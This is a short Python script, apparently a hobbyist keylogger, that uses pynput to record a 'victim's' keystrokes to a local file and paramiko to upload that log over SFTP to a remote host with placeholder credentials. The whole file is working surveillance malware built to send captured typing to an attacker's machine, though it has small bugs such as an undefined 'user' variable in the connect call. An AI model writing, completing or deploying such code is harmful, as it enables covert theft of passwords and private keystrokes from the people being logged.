#!/bin/python3.9
from pynput import keyboard
import paramiko

RHOSTS = "127.0.0.1" #Change this

username = "user" #Change this
password = "password" #Change this

# Text for the logs
text = ""

# Record the keys
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass

    else:
        text += str(key).strip("'")

    with open("/tmp/logs.txt", "a+") as thelogs:
        thelogs.write(text)

# Press esc to break from the listener
def on_release(key):
    if key == keyboard.Key.esc:
        return False

#Send the logs over SSH
def send_logs():
    s = paramiko.SSHClient()
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    s.connect(RHOSTS, 22, username=user, password=password,timeout = 15)
    sftp = s.open_sftp()
    sftp.put("/tmp/logs.txt", "/root/Keylogs/logs.txt")
    print("Keylogs sent")

# Using a while loop so it sends every time the victim hits "esc"
while True:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as thelistener:
        send_logs()
        thelistener.join()
